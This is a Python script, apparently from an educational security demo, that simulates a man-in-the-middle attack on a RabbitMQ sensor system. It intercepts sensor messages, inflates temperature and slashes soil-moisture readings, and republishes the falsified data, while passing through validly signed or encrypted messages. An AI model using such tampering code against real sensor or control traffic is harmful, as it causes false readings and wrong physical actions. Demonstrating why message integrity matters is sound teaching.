#!/usr/bin/env python
"""
Man-in-the-Middle (MITM) Attack Simulation

This script demonstrates how an attacker could intercept messages between the 
sensor and consumer, then modify them before forwarding to the destination.
This could lead to false readings being processed and incorrect actions taken.

Educational purposes only - demonstrates why message integrity is important.
"""

import json
import sys
import os
import time
import threading
from colorama import init, Fore, Style

# Add parent directory to path to import utils
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import get_rabbitmq_connection
from security_utils import verify_signature

# Initialize colorama for colored terminal output
init()

# Connect to RabbitMQ using CloudAMQP credentials
print(f"{Fore.RED}[MITM ATTACK] {Fore.YELLOW}Connecting to RabbitMQ...{Style.RESET_ALL}")
try:
    connection = get_rabbitmq_connection()
    channel = connection.channel()
    print(f"{Fore.GREEN}[MITM ATTACK] Connected successfully!{Style.RESET_ALL}")
except Exception as e:
    print(f"{Fore.RED}[MITM ATTACK] Connection failed: {e}{Style.RESET_ALL}")
    sys.exit(1)

# Storage for intercepted messages
intercepted_messages = []

# Declare our own exchanges for forwarding modified messages
# We'll use different names so we don't conflict with the original ones
channel.exchange_declare(exchange='mitm.fanout', exchange_type='fanout')
channel.exchange_declare(exchange='mitm.direct', exchange_type='direct')

# Listen to the original exchanges
channel.exchange_declare(exchange='sensors.fanout', exchange_type='fanout')
result = channel.queue_declare(queue='', exclusive=True)
queue_name = result.method.queue
channel.queue_bind(exchange='sensors.fanout', queue=queue_name)

# Also listen to secure messages
channel.exchange_declare(exchange='sensors.secure.fanout', exchange_type='fanout')
secure_result = channel.queue_declare(queue='', exclusive=True)
secure_queue_name = secure_result.method.queue
channel.queue_bind(exchange='sensors.secure.fanout', queue=secure_queue_name)

# Function to modify sensor data
def modify_message(original_data):
    """Modify the intercepted message to inject false data."""
    
    # Only modify if it's a regular JSON message
    if 'is_encrypted' in original_data:
        print(f"{Fore.RED}[MITM ATTACK] Cannot modify encrypted message - forwarding as is{Style.RESET_ALL}")
        return original_data
        
    # Check if it has a signature
    if 'signature' in original_data:
        # Verify if the signature is valid
        is_valid = verify_signature(original_data)
        if is_valid:
            print(f"{Fore.RED}[MITM ATTACK] Message is signed with valid signature - cannot modify without detection{Style.RESET_ALL}")
            return original_data
        else:
            print(f"{Fore.YELLOW}[MITM ATTACK] Message has invalid signature - will modify and keep broken signature{Style.RESET_ALL}")
    
    # Make a copy of the original data
    modified = original_data.copy()
    
    # Modify sensor values to cause incorrect actions
    if 'temperature' in modified:
        old_temp = modified['temperature']
        # Increase temperature by 10-15 degrees
        modified['temperature'] = round(old_temp + 15, 1)
        print(f"{Fore.YELLOW}[MITM ATTACK] Modified temperature from {old_temp} to {modified['temperature']}°C{Style.RESET_ALL}")
    
    if 'soil_moisture' in modified:
        old_moisture = modified['soil_moisture']
        # Drastically reduce soil moisture to trigger irrigation
        modified['soil_moisture'] = round(old_moisture * 0.3)
        print(f"{Fore.YELLOW}[MITM ATTACK] Modified soil moisture from {old_moisture} to {modified['soil_moisture']}{Style.RESET_ALL}")
        
    return modified

# Function to forward modified messages to our mitm exchange
def forward_modified_message(message, routing_key=''):
    """Forward the modified message to consumers."""
    message_json = json.dumps(message)
    
    try:
        # Forward to our mitm exchange
        channel.basic_publish(
            exchange='mitm.fanout',
            routing_key=routing_key,
            body=message_json
        )
        
        # Also send to direct exchange if it's an alert
        if 'temperature' in message and message['temperature'] > 35:
            channel.basic_publish(
                exchange='mitm.direct',
                routing_key='alerts',
                body=message_json
            )
        
        print(f"{Fore.GREEN}[MITM ATTACK] Forwarded modified message:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{json.dumps(message, indent=2)}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[MITM ATTACK] Failed to forward message: {e}{Style.RESET_ALL}")

# Callback for intercepted messages
def callback(ch, method, properties, body):
    try:
        # Parse the original message
        original = json.loads(body)
        
        print(f"{Fore.YELLOW}[MITM ATTACK] Intercepted message:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{json.dumps(original, indent=2)}{Style.RESET_ALL}")
        
        # Store the intercepted message
        intercepted_messages.append(original)
        
        # Modify the message
        modified = modify_message(original)
        
        # Forward the modified message
        forward_modified_message(modified)
        
    except json.JSONDecodeError:
        print(f"{Fore.RED}[MITM ATTACK] Could not parse message as JSON: {body}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[MITM ATTACK] Error processing message: {e}{Style.RESET_ALL}")

# Callback for secure messages
def secure_callback(ch, method, properties, body):
    try:
        # Parse the secure message
        secure_msg = json.loads(body)
        
        print(f"{Fore.YELLOW}[MITM ATTACK] Intercepted secure message:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{json.dumps(secure_msg, indent=2)}{Style.RESET_ALL}")
        
        # Check if the message has a signature
        if 'signature' in secure_msg:
            is_valid = verify_signature(secure_msg)
            if is_valid:
                print(f"{Fore.RED}[MITM ATTACK] Message has valid signature - modification would be detected{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[MITM ATTACK] Message has invalid signature - could modify without immediate detection{Style.RESET_ALL}")
                
                # Attempt to modify even with signature (this should be detected)
                modified = modify_message(secure_msg)
                forward_modified_message(modified)
                return
        
        # If the message is encrypted, we can't easily modify it
        if 'is_encrypted' in secure_msg and secure_msg['is_encrypted']:
            print(f"{Fore.RED}[MITM ATTACK] Message is encrypted - cannot view or modify the contents{Style.RESET_ALL}")
        
        # Just forward the original secure message as we can't modify it properly
        forward_modified_message(secure_msg)
        
    except json.JSONDecodeError:
        print(f"{Fore.RED}[MITM ATTACK] Could not parse secure message as JSON: {body}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[MITM ATTACK] Error processing secure message: {e}{Style.RESET_ALL}")

# Start consuming messages
channel.basic_consume(
    queue=queue_name,
    on_message_callback=callback,
    auto_ack=True
)

# Start consuming secure messages
channel.basic_consume(
    queue=secure_queue_name,
    on_message_callback=secure_callback,
    auto_ack=True
)

print(f"{Fore.GREEN}[MITM ATTACK] Man-in-the-Middle attack active - intercepting and modifying messages...{Style.RESET_ALL}")
print(f"{Fore.YELLOW}Press Ctrl+C to exit{Style.RESET_ALL}")

# Start a thread to periodically show statistics
def show_stats():
    while True:
        time.sleep(10)
        print(f"{Fore.CYAN}[MITM ATTACK] Statistics: Intercepted {len(intercepted_messages)} messages{Style.RESET_ALL}")

stats_thread = threading.Thread(target=show_stats)
stats_thread.daemon = True
stats_thread.start()

try:
    # Start consuming messages
    channel.start_consuming()
except KeyboardInterrupt:
    print(f"{Fore.RED}[MITM ATTACK] Stopping MITM attack{Style.RESET_ALL}")
    channel.stop_consuming()
    
connection.close() 